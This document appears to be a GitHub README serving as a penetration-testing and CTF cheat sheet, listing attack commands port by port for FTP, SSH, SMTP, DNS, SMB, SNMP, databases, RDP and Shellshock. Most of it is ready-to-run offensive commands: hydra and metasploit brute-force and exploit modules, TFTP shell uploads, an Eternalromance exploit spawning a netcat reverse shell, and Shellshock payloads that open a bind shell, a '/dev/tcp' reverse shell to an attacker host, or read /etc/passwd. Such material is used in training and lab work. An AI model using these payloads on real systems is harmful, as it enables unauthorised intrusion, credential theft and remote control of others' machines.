# N-W

## Cheat Sheet for Network,CTF. Complilation from various sources.



![alt text](https://github.com/VitthalS/N-W/blob/master/mindmap.png?raw=true)

**21 FTP**

- FTP anonymous sign in

        ftp 10.10.10.X
        ftp> get flag.txt

    `mget *` -  downloads everything

- Enumerate:
        
        nmap --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 $ip

- Bruteforce : 
        
        hydra -l user -P /usr/share/john/password.lst ftp://$ip:21

- Bruteforce with metasploit

        msfconsole -q msf> search type:auxiliary login: msf> use auxiliary/scanner/ftp/ftp_login

-  Vuln scan
        
         nmap --script=ftp-* -p 21 $ip

**TFTP**

If unauthenticated access is allowed with write permissions you can upload a shell:

```
tftp $ip
tftp> ls
?Invalid command
tftp> verbose
Verbose mode on.
tftp> put shell.php
Sent 3605 bytes in 0.0 seconds [inf bits/sec]
```

`nmap -sU -p 69 --script tftp-enum.nse $ip` 

or

```
    use auxiliary/scanner/tftp/tftpbrute
    connecting/interacting: 
    tftp $ip
    tftp> put payload.exe 
    tftp> get file.txt
```


**22 SSH**

- nc 10.10.10.XX 22
- telnet 10.10.10.XX 22

- Enumerate:

        nmap -p 22 –script ssh-brute –script-args userdb=users.lst,passdb=pass.lst –script-args ssh-brute.timeout=4s


- User enumeration : 

```
   use auxiliary/scanner/ssh/ssh_enumusers
   set user_file /usr/share/wordlists/metasploit/unix_users.txt
   run
```

```
    python /usr/share/exploitdb/exploits/linux/remote/40136.py -U /usr/share/wordlists/metasploit/unix_users.txt $ip
```

- Bruteforce : 
        
         hydra -v -V -l root -P password-file.txt $ip ssh

    With list of users:
    
        hydra -v -V -L user.txt -P /usr/share/wordlists/rockyou.txt -t 16 192.168.33.251 ssh

    You can use -w to slow down

- Download a file from SSH Box :
        
         python3 -m http.server
         scp username@hostname:/path/to/remote/file /path/to/local/file

- Port Forwarding : 
https://github.com/itsKindred/PortPush

        ssh -L 80:intra.example.com:80 gw.example.com
This example opens a connection to the gw.example.com jump server, and forwards any connection to port 80 on the local machine to port 80 on intra.example.com.

- Login using SSH key
        
        chmod 600 key
        ssh -i key username@10.10.10.XX

Port Knocking - 

- Bash 


        for x in 3333 4444 5555; do nmap -sU -Pn --host-timeout 201 --max-tries 0 -p $x 10.10.10.XX; done
        
- Knock
        
        apt-get install knockd
        knock 192.168.1.102 3333 4444 5555

After that you have to scan the network to see if any new port is open.


**25 SMTP**

- nc -nvv IP 25
- telnet IP 25

- Users enumeration
     
        for server in $(cat smtpmachines); do echo "XXXXServerXXX" $server "XXXXXServerXXXXXX"; smtp-user-enum -M VRFY -U userlist.txt -t $server;done #for multiple servers

- 
        smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $ip

- 
        
        use auxiliary/scanner/smtp/smtp_enum
        *Command to check if a user exists*
        VRFY root
        *Command to ask the server if a user belongs to a mailing list*
        EXPN root

- Enumeration and vuln scanning:
        
         nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $ip

- Bruteforce

        hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V

- Metasploit user enumeration

        use auxiliary/scanner/smtp/smtp_enum

- Testing for open relay

        telnet $ip 25
        EHLO root
        MAIL FROM:root@target.com
        RCPT TO:example@gmail.com
        DATA
        Subject: Testing open mail relay.
        Testing SMTP open mail relay. Have a nice day.
        .
        QUIT

**53 DNS**

- add boxname /etc/hosts

- Find name servers
        
        host -t ns $ip

- Find email servers
      
        host -t mx $ip

- Subdomain bruteforcing
    
        for ip in $(cat list.txt); do host $ip.$website; done
  
- Reverse dns lookup bruteforcing
  
         for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v "not found"

- Zone transfer request
          
         host -l $ip ns1.$ip
         dnsrecon -d $ip -t axfr
  
- Finds nameservers for a given domain
    
        host -t ns $ip| cut -d " " -f 4 #
        dnsenum $ip

- Nmap zone transfer scan
 
         nmap $ip --script=dns-zone-transfer -p 53

- Finds the domain names for a host.
        
         whois $ip

- Find the IP and authoritative servers.
  
         nslookup $ip

- Finds misconfigure DNS entries.
        
         host -t ns $ip

**79 Finger**

- https://touhidshaikh.com/blog/?p=914

- Use [script](https://github.com/pentestmonkey/finger-user-enum) from github
        
        finger username@IP

- Find Logged in users on target.
        
         finger @$ip
> if there is no user logged in this will show no username

- Using Metasploit fo Brute-force target
            
            use auxiliary/scanner/finger/finger_users
            set rhosts $ip
            set users_file 
            run


- 
```
wget http://pentestmonkey.net/tools/finger-user-enum/finger-user-enum-1.0.tar.gz
tar -xvf finger-user-enum-1.0.tar.gz
cd finger-user-enum-1.0
perl finger-user-enum.pl -t 10.22.1.11 -U /tmp/rockyou-top1000.txt
```

**110 Pop3**

- telnet IP 110

- Test authentication:
    
        telnet $ip 110
        USER uer@$ip
        PASS admin
        list
        retr 1

**111 RPC Bind**

- rcpclient -U "" IP
- rpcinfo -p IP

**135 RPC**

- nmap -n -v -sV -Pn -p 135 –script=msrpc-enum IP

    Enumerate, shows if any NFS mount exposed:

- rpcinfo -p $ip

- nmap $ip --script=msrpc-enum

- msf > use exploit/windows/dcerpc/ms03_026_dcom


**445/139/135  SMB**

- SMB and SAMBA
> Server Message Block (SMB) Protocol is a network file sharing protocol, and as implemented in Microsoft Windows
> Samba has provided secure, stable and fast file and print services for all clients using the SMB/CIFS protocol, such as all versions of DOS and Windows, OS/2, Linux and many others

- SMB uses the following TCP and UDP ports:
    
        netbios-ns 137/tcp # NETBIOS Name Service
        netbios-ns 137/udp
        netbios-dgm 138/tcp # NETBIOS Datagram Service
        netbios-dgm 138/udp
        netbios-ssn 139/tcp # NETBIOS session service
        netbios-ssn 139/udp
        microsoft-ds 445/tcp # if you are using Active Directory


- Enumeration
    
    nmblookup — NetBIOS over TCP/IP client used to lookup NetBIOS names
        
            nmblookup -A $ip

 
            enum4linux -a $ip

Used to enumerate data from Windows and Samba hosts and is a wrapper for smbclient, rpcclient, net and nmblookup
Look for users, groups, shares, workgroup/domains and password policies

- list smb nmap scripts

        locate .nse | grep smb

- find SAMBA version number using the SMB OS discovery script:

         nmap -A $ip -p139
    Google to see if version is vulnerable

    SAMBA 3.x-4.x #  vulnerable to linux/samba/is_known_pipename

    SAMBA 3.5.11 # vulnerable to linux/samba/is_known_pipename

- Smbmap
        
        smbmap -H $ip
        smbmap -R $sharename -H $ip #Recursively list dirs, and files
        smbmap -R $sharename -H $ip -A $fileyouwanttodownload -q 
    Downloads a file in quiet mode

    Downloads to the /usr/share/smbmap directory

    Generally works a bit better than enum4linux as it enum4linux tends to error out a bit
    
    Ippsec using this tool - https://www.youtube.com/watch?v=jUc1J31DNdw&t=445s

- Null Session

    A null SMB session can be used to gather passwords and useful information from SMB 1 by looking in shares that are not password protected for interesting files. Windows NT/2000 XP default settings allow this. Windows 2003/XP SP2 SMB this behaviour is disabled.

- Null session and extract information.
        
        nbtscan -r $ip

- Version

        msfconsole; use auxiliary/scanner/smb/smb_version; set RHOSTS $ip; run

- MultiExploit
        
        msfconsole; use exploit/multi/samba/usermap_script; set lhost 10.10.14.x; set rhost $ip; run

- Show all nmap SMB scripts

        ls -ls /usr/share/nmap/scripts/smb*

- Quick enum:

        nmap --script=smb-enum* --script-args=unsafe=1 -T5 $ip

- Quick vuln scan:

        nmap --script=smb-vuln* --script-args=unsafe=1 -T5 $ip

- Full enum and vuln scanning:
        
        nmap --script=smb2-capabilities,smb-print-text,smb2-security-mode.nse,smb-protocols,smb2-time.nse,smb-psexec,smb2-vuln-uptime,smb-security-mode,smb-server-stats,smb-double-pulsar-backdoor,smb-system-info,smb-vuln-conficker,smb-enum-groups,smb-vuln-cve2009-3103,smb-enum-processes,smb-vuln-cve-2017-7494,smb-vuln-ms06-025,smb-enum-shares,smb-vuln-ms07-029,smb-enum-users,smb-vuln-ms08-067,smb-vuln-ms10-054,smb-ls,smb-vuln-ms10-061,smb-vuln-ms17-010,smb-os-discovery --script-args=unsafe=1 -T5 $ip

- Full enum & vuln scan:
        
        nmap -p139,445 -T4 -oN smb_vulns.txt -Pn --script 'not brute and not dos and smb-*' -vv -d $ip

- Mount:
        
        smbclient //$ip/share -U username

- Anonymous mount:
    
    smbclient //$ip/share # hit enter with blank password

- EternalBlue
    Exploits a critical vulnerability in the SMBv1 protocol
    
    Worth testing Eternal blue - you might get lucky although (the system should be patched to fix this)
    
    Vulnerable versions - Windows 7, 8, 8.1 and Windows Server 2003/2008/2012(R2)/2016

        nmap -p 445 $ip --script=smb-vuln-ms17-010

    Exploit Using https://github.com/worawit/MS17-010

            python woraMS17-010.py $IP  

- Bruteforce

        hydra -l administrator -P /usr/share/wordlists/rockyou.txt -t 1 $ip smb

    Any metasploit exploit through Netbios over TCP in 139, you need to set:
        
        Set SMBDirect false



- SMBClient

        smbclient -L //IP
        smbclient -L //192.168.1.2/myshare -U anonymous
        rpcclient -U “” 192.168.1.2    ///when asked enter empty password

- RPCClient 
 
        rpcclient $>srvinfo
        rpcclient $>enumdomusers
        rpcclient $>querydominfo
        rpcclient $>getdompwinfo   //password policy
        rpcclient $>netshareenum

- `nbtscan IP`

- If Port 139 Use [trans2open](https://www.exploit-db.com/exploits/10/)
        
        perl '/root/smbenum/trans2root.pl' -t linx86 -H $IP -h $IP


- Windows vulnerable to Eternalromance exploit? 
     
    ```
    smbclient ‘\\$IP\share'
    put nc.exe
    python eternalromance.py $IP "" "" “c:\\share\\nc -nv $my_ip 4445 -e cmd.exe”

    ```
    
**161/162 UDP SNMP**

- Enumeration
    
    enumerateEommunity strings

        ./onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.11.1.73
Community string too long,If you see this download onesixtyone from Github and run it there

- v1
        
        snmp-check -t $ip -c public

- use nmap to enumerate info

        nmap -sU -p161 --script "snmp-*" $ip
        nmap -n -vv -sV -sU -Pn -p 161,162 –script=snmp-processes,snmp-netstat IP


- snmpwalk
        
        apt install snmp-mibs-downloader #translates MIBs into readable format
        for community in public private manager; do snmpwalk -c $community -v1 $ip; done
        snmpwalk -c public -v1 $ip
        snmpenum $ip public windows.txt
  
        
- Less noisy:
    
        snmpwalk -c public -v1 $ip 1.3.6.1.4.1.77.1.2.25

- Based on UDP, stateless and susceptible to UDP spoofing

            nmap -sU --open -p 16110.1.1.1-254 -oG out.txt

-  
        hydra -P passwords.txt -v 192.168.1.10 snmp
        public
        private
        community

- we need to know that there is a community called public

        snmpwalk -c public -v1  10.1.1.1

- enumerate windows users
        
        nmap -sU -p 161 --script /usr/share/nmap/scripts/snmp-win32-users.nse $IP

- enumerates running processes
        
        snmpwalk -c public -v1 192.168.11.204 1.3.6.1.2.1.25.4.2.1.2

- SNMP MIB Trees
  
          1.3.6.1.2.1.25.1.6.0 System Processes
          1.3.6.1.2.1.25.4.2.1.2 Running Programs
          1.3.6.1.2.1.25.4.2.1.4 Processes Path
          1.3.6.1.2.1.25.2.3.1.4 Storage Units
          1.3.6.1.2.1.25.6.3.1.2 Software Name
          1.3.6.1.4.1.77.1.2.25 User Accounts
          1.3.6.1.2.1.6.13.1.3 TCP Local Ports

- Metasploit
           
           auxiliary/scanner/snmp/snmp_enum
           auxiliary/scanner/snmp/snmp_enum_hp_laserjet
           auxiliary/scanner/snmp/snmp_enumshares
           auxiliary/scanner/snmp/snmp_enumusers
           auxiliary/scanner/snmp/snmp_login


**389 LDAP**

- JXplorer - http://jxplorer.org/

- Enumeration:

        ldapsearch -h $ip -p 389 -x -b "dc=mywebsite,dc=com"


**1433 MySQL**

- Nmap scan
```
nmap -sV -Pn -vv -script=mysql* $ip -p 3306

nmap -n -v -sV -Pn -p 1433 –script ms-sql-brute –script-args userdb=users.txt,passdb=passwords.txt IP

nmap -n -v -sV -Pn -p 1433 –script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password IP

nmap -sV -Pn -vv --script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 $ip -p 3306
```

- Looking for metasploit modules - https://www.offensive-security.com/metasploit-unleashed/hunting-mssql/


- If Mysql is running as root and you have access, you can run commands:
        
        mysql> select do_system('id');
        mysql> \! sh


**1521/1560 ORACLE DATABASE**

- Nmap Scan
```
* nmap -n -v -sV -Pn -p 1521 –script=oracle-enum-users –script-args sid=ORCL,userdb=users.txt IP
* nmap -n -v -sV -Pn -p 1521 –script=oracle-sid-brute IP

```

- [TNSCMD](http://dokfleed.net/files/audit/tnscmd10g.zip)
  
Tool used to to talk to TNS-Listener.
       
        ./tnscmd.pl status -h 192.168.0.2

        tells us if we can communicate with listener
        error means it may be password protected

**2049 NFS**

- Nmap scan
    
        nmap –script=nfs-ls IP

- nmapspy - https://github.com/bonsaiviking/NfSpy

- Show all Mounts
        
        showmount -e IP
        showmount -a IP

- Mount a NFS share

        mount $ip:/vol/share /mnt/nfs


**3306 MySQL**

- Nmap Scan

        nmap -n -v -sV -Pn -p 3306 –script=mysql-info,mysql-audit,mysql-enum,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-users,mysql-query,mysql-variables,mysql-vuln-cve2012-2122 IP

- 
    
    mysql –h IP -u root -p
        
            start mysql if errors (ERROR 2002 (HY000): Can’t connect to local MySQL server through socket ‘/var/run/mysqld/mysqld.sock’ (2 “No such file or directory”))
                sudo /etc/init.d/mysql start
            show databases;
            show tables;
            use tablename;
            describe table;
            select table1, table2 from tablename;


**3389 RDP**

- Bruteforce

        ncrack -vv --user administrator -P password-file.txt rdp://$ip
        hydra -t 4  -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip





**HeartBleed**

- Test web server

        sslscan $ip:443

**Shellshock**

- Methods
    
        git clone https://github.com/nccgroup/shocker; cd shocker; ./shocker.py -H $ip  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose;  ./shocker.py -H $ip  --command "/bin/cat /etc/passwd" -c /cgi-bin/admin.cgi --verbose

- 

        echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc $ip 80

- 
        curl -x TARGETADDRESS -H "User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/HOSTIP/1234 0>&1" $ip/cgi-bin/status


- Shellshock over SSH:
    
        ssh username@$ip '() { :;}; /bin/bash'
